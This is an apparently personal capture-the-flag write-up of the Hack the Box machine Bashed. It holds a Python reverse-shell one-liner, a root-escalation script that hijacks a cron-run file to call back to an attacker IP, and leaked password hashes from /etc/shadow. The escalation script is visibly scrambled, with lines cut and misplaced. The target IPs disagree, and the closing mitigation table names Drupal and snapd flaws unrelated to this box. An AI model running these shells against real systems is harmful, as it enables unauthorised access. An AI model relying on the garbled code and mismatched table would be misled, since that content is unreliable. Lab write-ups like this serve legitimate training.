---
title: "Hack the Box (HTB) - Bashed"
description: "?"
date: 2024-08-27 12:00:00 -100
image: /assets/images/HTB - Bashed/Bashed Tumbnail.jpg
categories: [CTF]
tags: []    # TAG names should always be lowercase
---

## Enumeration

We'll start by running [AutoRecon](https://github.com/Tib3rius/AutoRecon) against our box at `10.10.10.68`

```bash
sudo autorecon 10.10.10.56
```

Looking at the results, we see the following:

- 80/tcp open http Apache httpd 2.4.18 ((Ubuntu))

Just this Apache web server. Let's take a look

![Inital Web Page](/assets/images/HTB%20-%20Bashed/Inital%20web%20Page.png)

Clicking on `https://github.com/Arrexel/phpbash` link takes us to a github repo

![phpbash](/assets/images/HTB%20-%20Bashed/php%20bash.png)

This is a tool that lets pen testers run terminal commands directly through the web browser (given that they are able to upload `phpbash` to whatever they're trying to pentest) and would be useful in situations where you can't get shell access

Let's check our feroxbuster scan

![Feroxbuster](/assets/images/HTB%20-%20Bashed/php%20bash%20dirbuster.png)

This web server already has phpbash.php installed, we will ironically be using this to pentest this CTF

Running sudo -l shows us the following information

![wwwdata sudo -l](/assets/images/HTB%20-%20Bashed/wwwdata%20sudo%20-l.png)

Before we proceed, I would like to get a proper shell

```bash
# First Start NC
nc -lvnp 1234

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![Rev Shell](/assets/images/HTB%20-%20Bashed/Reverse%20Shell.png)

Let's upgrade our shell

```bash
Python3 -c 'import pty;pty.spawn ("/bin/bash")'

# Background with ctrl + z
stty raw-echo;fg

export TERM=xterm
```

Great, now we have a proper shell with full functionality

Going back  to our sudo -l. We see that we are able to 

- `(scriptmanager : scriptmanager) NOPASSWD: ALL`

Which mean we can run any command as the scriptmanager user without needing a password

We don't technically need to switch to that account, but let's do it anyway

```bash
sudo -u scriptmanager /bin/bash
```

![ScriptManager SU](/assets/images/HTB%20-%20Bashed/Script%20Manager.png)

Looking at the root directory, we see that there's a folder called `scripts`

![Scripts Directory](/assets/images/HTB%20-%20Bashed/Scripts%20Directory.png)

Inside this folder we see two files, `test.py` & `test.txt`

![Scripts](/assets/images/HTB%20-%20Bashed/Scripts.png)

As we can see from the output, `test.py` is a script that's owned by us & simultaneously writing to a file that's owned by root. This suggests test.py is being executed by a process with sufficient privileges (likely root) to write to test.txt


 We can easily modify this script to give us a root shell

```bash
nano test.py
```

```python
import socket
import subprocess
import os

def spawn_shell():
    # Connect to attacker's machine
    attacker_ip = "10.10.14.36"  # Replace with your IP address
    aeate a socket and connect to the attacker's machine
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))
    ttacker_port = 9002  # Replace with your chosen port
    
    # Cr
    # Redirect stdin, stdout, and stderr to the socket
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr

    # Start a shell
    p = subprocess.call(["/bin/bash", "-i"])

if __name__ == "__main__":
    spawn_shell()
```

Start up nc

```bash
nc -lvnp 9002
```

Sit back and wait!

![Root](/assets/images/HTB%20-%20Bashed/Root%20Bashed.png)

GG, we've rooted Bashed!

## Additional Post Root Fun

### Finding the crontab that allowed root exploit

```bash
crontab -l
```

![crontab root](/assets/images/HTB%20-%20Bashed/crontab%20root.png)



Checking the `/etc/shadow` file gives us the hashes for the users we've discovered in this box

`arrexel:$1$mDpVXKQV$o6HkBjhl/e.S.bV96tMm6.`

`scriptmanager:$6$WahhM57B$rOHkWDRQpds96uWXkRCzA6b5L3wOorpe4uwn5U32yKRsMWDwKAm.RF6T81Ki/MOyo.dJ0B8Xm5/wOrLk35Nqd0`

`root:$6$bgp25dyI$G94wQqO8btpDME48280tRVWzBA5nIZPWF2uOI5H6eHOER/nvY/RZOzYv4r51G0ML9dYN/RqjcYPOsaVdpJSBP/`

It looks like these are using different hash algorithms

- arrexel ues MD5 `($1$)`
- scriptmanager and root use SHA-512 `($6$)`

I am going to skip attempting to crack this as I have limited resources on my VM














## Vulnerabilities & Mitigation's

| **Vulnerability**                                | **Mitigation**                                                                                     |
|--------------------------------------------------|----------------------------------------------------------------------------------------------------|
| **Drupalgeddon 2 (CVE-2018-7600)**               | Update Drupal to a patched version. For Drupal 7.x, upgrade to 7.58 or later. For Drupal 8.x, upgrade to 8.5.1 or later. Apply security patches provided by Drupal. |
| **Snap Package Privilege Escalation**            | Ensure snapd is updated to the latest version. For CVE-2019-7304, ensure snapd version is 2.37.1 or higher. Regularly review and update package management tools. |

### Remediation References

- [Drupal Security Advisories](https://www.drupal.org/security)
- [Snapd Security Updates](https://snapcraft.io/docs/security-updates)